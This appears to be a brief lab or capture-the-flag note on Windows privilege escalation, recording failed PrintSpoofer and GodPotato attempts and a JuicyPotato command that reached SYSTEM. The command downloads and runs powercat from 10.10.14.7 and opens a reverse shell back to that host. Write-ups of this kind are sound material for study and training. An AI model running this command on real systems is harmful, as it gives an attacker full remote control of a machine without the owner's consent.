```powershell
whoami /priv
```
![[Pasted image 20240910104349.png]]

Attempted to privesc using PrintSpoofer64 and GodPotato but none worked.

Tried using JuicyPotato using the following command and got an elevated shell as `nt authority\system`
```powershell
JuicyPotato.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p "C:\Windows\System32\cmd.exe" -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.7/powercat.ps1');powercat -c 10.10.14.7 -p 443 -e cmd" -t *
```


